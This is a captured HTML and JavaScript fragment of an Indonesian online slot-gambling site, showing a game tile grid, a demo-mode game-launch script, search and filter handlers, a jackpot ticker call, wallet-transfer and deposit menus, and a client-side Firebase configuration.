                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/ac96d97b54fa2e59a68780b080d1fc9e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Prosperity Lion">Prosperity Lion</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hip Hop Panda" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hip Hop Panda', '/assets/games/i/165x220/pgshoft/86723b8c6e090ab7beb5e1b850b2d2e0.webp?v=0.1' , '33', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/86723b8c6e090ab7beb5e1b850b2d2e0.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hip Hop Panda">Hip Hop Panda</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Medusa II" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Medusa II', '/assets/games/i/165x220/pgshoft/e1f3e66f5e51acb507e8fbec99854336.webp?v=0.1' , '6', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e1f3e66f5e51acb507e8fbec99854336.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Medusa II">Medusa II</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hood vs Wolf" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hood vs Wolf', '/assets/games/i/165x220/pgshoft/e36cc49c347684e109b5de2a0644bbaf.webp?v=0.1' , '18', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e36cc49c347684e109b5de2a0644bbaf.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hood vs Wolf">Hood vs Wolf</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legend of Hou Yi" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legend of Hou Yi', '/assets/games/i/165x220/pgshoft/28ac37db24a5777127362c3e762fcebc.webp?v=0.1' , '34', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/28ac37db24a5777127362c3e762fcebc.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legend of Hou Yi">Legend of Hou Yi</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Symbols of Egypt" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Symbols of Egypt', '/assets/games/i/165x220/pgshoft/96752443c7efa37657396c592c77654c.webp?v=0.1' , '41', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/96752443c7efa37657396c592c77654c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Symbols of Egypt">Symbols of Egypt</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Win Win Won" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Win Win Won', '/assets/games/i/165x220/pgshoft/0cd0c3176cf0e4661781f13eaebbe4c8.webp?v=0.1' , '24', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/0cd0c3176cf0e4661781f13eaebbe4c8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Win Win Won">Win Win Won</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Gods" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Gods', '/assets/games/i/165x220/pgshoft/54ae7348397d03b949abf9e104bb9057.webp?v=0.1' , '3', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/54ae7348397d03b949abf9e104bb9057.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Gods">Fortune Gods</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Honey Trap of Diao Chan" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Honey Trap of Diao Chan', '/assets/games/i/165x220/pgshoft/4d78236cbc611ace0e09be912eb00dd4.webp?v=0.1' , '1', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/4d78236cbc611ace0e09be912eb00dd4.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Honey Trap of Diao Chan">Honey Trap of Diao Chan</h5>
        </a>
        
     
  </div>

</div>

<div class="nifty-modal slide-in-bottom " id="gamelinksModal-1">
  <div class="md-content">
    <div class="md-body">
      <div class="row mb-4 no-gutters">
        <div class="col-xs-5">
          <img src="" class="img-fluid">
        </div>
        <div class="col-xs-7">
          <div class="g-title"></div>
        </div>
        
        <input type="hidden" value="" name="hiddenGameID-001" id="hiddenGameID-001"> <input type="hidden" value="" name="hiddenGameCode001" id="hiddenGameCode001">
        <input type="hidden" value="" name="hiddenSubGameCode001" id="hiddenSubGameCode001">

      </div>

      <div class="row pt-2">
        <div class="col-xs-5">
        </div>
        <div class="col-xs-7">
          <button class="btn btn-block btn-primary" onclick="subGameLaunch(event,0)" i18n="@PlayNow">
            MAIN SEKARANG
          </button>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script>
function subGameLaunch(e, isDemo) {
    // Ambil nilai dari input tersembunyi
    var provider = $('#hiddenGameID-001').val();
    var gameCode = $('#hiddenGameCode001').val();

    // Debugging: Cek di console browser (F12) apakah nilainya terbaca
    console.log("Provider:", provider);
    console.log("Game Code:", gameCode);

    if (!gameCode || gameCode === "") {
        alert("Gagal: ID Game tidak ditemukan di sistem!");
        return;
    }

    var gameData = {
    provider: $('#hiddenGameID-001').val(),
    gameCode: $('#hiddenGameCode001').val(),
    subCode: $('#hiddenSubGameCode001').val(),
    isDemo: 1  // Paksa ke mode demo
    };

    fetch('launch-game.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(gameData)
    })
    // ... sisa kode fetch tetap sama

    .then(function(response) {
      if (!response.ok) throw new Error('Server tidak merespons dengan benar');
      return response.json();
    })
    .then(function(data) {
      if (data.success && data.launchUrl) {
        window.location.href = data.launchUrl;
      } else {
        // Tampilkan pesan error spesifik dari server (jika ada)
        console.error("Gagal meluncurkan game:", data);
        alert(data.message || "Gagal memuat game. Silakan coba lagi.");
      }
    })
    .catch(function(error) {
      console.error("Error Sistem:", error);
      alert("Koneksi ke server game terputus.");
    });
  }
</script>
<div class="nifty-modal slide-in-bottom " id="filterModal-2">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            <p id="" i18n="">Select a filter : 
                                                                                </p></div>
                        <div>
                            <button class="btn btn-primary" id="btnApplyFilter_01">APPLY</button>
                        </div>
  				</div>
			</div>
</div>
<div class="md-overlay"></div>

<div class="nifty-modal slide-in-bottom " id="searchModal">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            	<div class="search_filter">
											            <span class="srch_icon md-close"><i class="icon-keyboard_arrow_left"></i></span>
											            <input type="text" matinput="" placeholder="Search" [(ngmodel)]="filterInput" maxlength="255" class="search" (change)="search($event)" i18n-placeholder="@Search">
											            <button matsuffix="" class="btn srch_button" (click)="clearSearch($event)"><i class="icon-x-square"></i></button>
											        </div>
                        </div>

  				</div>
			</div>
</div>
<div class="md-overlay"></div>
<script>
         var joinedJpIds = "";
         var gameCode = "pgsoft_slot";
       function showGameLinks(e,name,imgSrc,gameCode,subCode){

            $('#gamelinksModal-1 .g-title').text(name);
            $('#gamelinksModal-1 img').attr( 'src',imgSrc);
            $('#hiddenGameCode001').val( gameCode );
            $('#hiddenSubGameCode001').val( subCode );
            $('#gamelinksModal-1').nifty("show");
        }


          $(document).ready(function () {
              var hotGame = '';
          
              if(hotGame){ 
                  $('.game-box').each(function() {
                        var isMatch = hotGame == $(this).data('title');
                        if(isMatch){
                              $(this).trigger('click');
                              return false;
                        }
                  });
              }

              /*search*/
              $('.search').keyup(function() {
                    
                    var value = $(this).val().toLowerCase();
                    var exp = new RegExp(value);
                    $('.game-box').each(function() {
                    var isMatch = exp.test(((typeof $(this).find('h5').data('title') == 'string') ? $(this).find('h5').data('title').toLowerCase() : $(this).find('h5').data('title')));
                    $(this).toggle(isMatch);
                    });
              });
              $('.srch_button').click(function(){
                    $('.search').val("");
                    $('.search').trigger("keyup");
              });
              /*search end*/


                $('.sub-games .filter .top').addClass('active');

                  function filterGameBoxes(self){

                        $('.sub-games .filter .btn').removeClass('active');
                        $(self).addClass('active');
                        var filterType= $(self).data('filter');

                        $('.sub-games .game-box').hide();
                        $('.sub-games .game-box').filter(function(){
                        return $(this).data("filter").indexOf(filterType)>=0;
                        }).show();

                  }


                  //Default to All Games :
                  filterGameBoxes($('.sub-games .filter .btn[data-filter=ALL]')[0]);

                  //Add filter btn event listen
                  $('.sub-games .filter .btn.f').click(function(){

                               filterGameBoxes(this);
                  })

                  $('#btnApplyFilter_01').click(function(){

                         var selFilter = $('input[name="rdFilterSubGames"]:checked').val();
                          var e =  $('#btnFilters_003')[0];
                          $(e).data('filter', selFilter);
                          filterGameBoxes(e);
                          $('#filterModal-2').nifty('hide');


                  })
                

                  if(joinedJpIds){
                              var url = "https://jpn-ticker-gcp-str.hep200512.com/v1/ticker?currency="+window.currencyCode +"&jackpotIds=" + joinedJpIds; 
           
                              
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                                    delete $.ajaxSettings.headers["X-CSRF-TOKEN"];
                                    // console.log("remove X-CSRF-TOKEN header");
                                    // alert("remove X-CSRF-TOKEN header");
                              }
                              $.ajax({
                                          url: url,
                                          type: 'GET', 
                                          dataType: 'json', 
                                          headers: {
                                   
                                          },
                                          beforeSend: function(jqXHR, settings) {
                                                          
                                            }
                              })
                              .done(function(data) {
                                    if(data && data.length>0 ){
                                                //console.log(data);
                                          for (let i = 0; i < data.length; i++) {
                                                var  jp  = data[i];
                                                if(jp.jackpotId && jp.pools ){
                                                      var pool = jp.pools;
                                                      for(var key in pool ){ 
                                                                  if(pool.hasOwnProperty(key)){
                                                                        var amt = pool[key].amount;
                                                                       
                                                                        if(amt > 0 ){
                                                                              // console.log(amt);
                                                                               
                                                                              amt = amt.toString()
                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').text( window.currencyCode +' ' +window.formatNumber(amt)).show();

                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').each(function () {
                                                                              $(this).prop('Counter', 0).animate({
                                                                                    Counter: amt
                                                                              }, {
                                                                                    duration: 7000,
                                                                                    step: function (func) {
                                                                                    $(this).text(window.currencyCode +' ' +window.formatNumber(func.toString()));
                                                                                    }
                                                                              });
                                                                              });
                                                                        }
                                                                  }
                                                              break;
                                                      }
                                                }
                                                   
                                          }

                                                
                                      }
                                                
                                  
                                   
                              }) ;
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                              
                                    $.ajaxSettings.headers["X-CSRF-TOKEN"] = $('meta[name="csrf-token"]').attr('content'); 
                                    // console.log("add back X-CSRF-TOKEN  header");
                                    // alert("add back X-CSRF-TOKEN header");
                              }
                 }

          });
</script>

                    <div class="mobilesite-footer">  
          <div class="container">
              <style media="screen">
.left-custom-livechat-code{
  bottom: 58px !important;
}
#chat-widget-container{
  bottom: 51px !important;
}
</style>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                        <div class="flex-row  text-center">
                <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/home.php?i=1#"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                

                                
                                  <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/promosaya.php"><i class="icon-gift"></i> <div style="text-transform:uppercase;">Promo saya</div></a>
                  </div>
                
                <div class=" footericon-single">
                    <a href="javascript:void(0);" class="text-uppercase togglemenu-trigger footer-funds" data-showid="#fundshover_menu"><i class="icon-transfer"></i> <div>Dana</div></a>
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="">Withdraw</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                </div>
                                                <div class=" footericon-single">
                    <a href="https://www.Goblin88.site/memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
                      
                            <div class="mail_icon" style="">26</div>
                        
                    </a>
                </div>
                
<div class=" footericon-single" style="position: relative">
    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu"><i class="icon-chat1"></i><div>LIVE CHAT</div></a>
    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu">
        <li>
            <!-- 👇 Link statis diganti pakai variabel PHP $linkLiveChat, dan script JS dihapus -->
            <a href="javascript:void(0)" id="livechat-btn" onclick="openLiveChat('https://direct.lc.chat/19926541/' , '')">
                <i class="icon-chat1"></i>
            </a>
        </li>
                                                              
        <li>
            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank "><i class="icon-whatsapp"></i></a>
        </li>                          
                                                   
        <li>
            <a href="https://telegram.me/BABYBOSSQOFFICIAL" target="_blank "><i class="icon-telegram"></i></a>
        </li>
    </ul>
</div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="6mpScfAoG0WWOBdqpvKSa5nHR7C4udBoqhKvvRL6">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="188.67">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk">188.67</div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00" required="">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="/assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <script>
    

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
    <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
    <link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


    <script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  true  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='MERCUSUAR77';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-25 08:25:39";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'BPDSULTENG'){
                    custom_minLength = 10;
                    custom_maxLength = 15;
                }
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
